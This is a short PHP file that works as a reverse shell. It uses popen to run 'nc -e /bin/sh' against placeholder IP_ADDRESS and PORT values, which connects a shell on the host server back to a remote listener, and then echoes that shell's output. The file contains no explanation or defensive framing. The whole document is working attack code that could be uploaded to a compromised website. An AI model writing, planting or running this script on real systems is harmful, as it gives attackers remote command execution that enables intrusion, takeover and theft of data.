<?php
$ip = 'IP_ADDRESS';
$port = PORT;
$command = 'nc -e /bin/sh '.$ip.' '.$port;
$handle = popen($command, 'r');
while (!feof($handle)) {
    $buffer = fgets($handle);
    echo $buffer;
}
pclose($handle);
?>
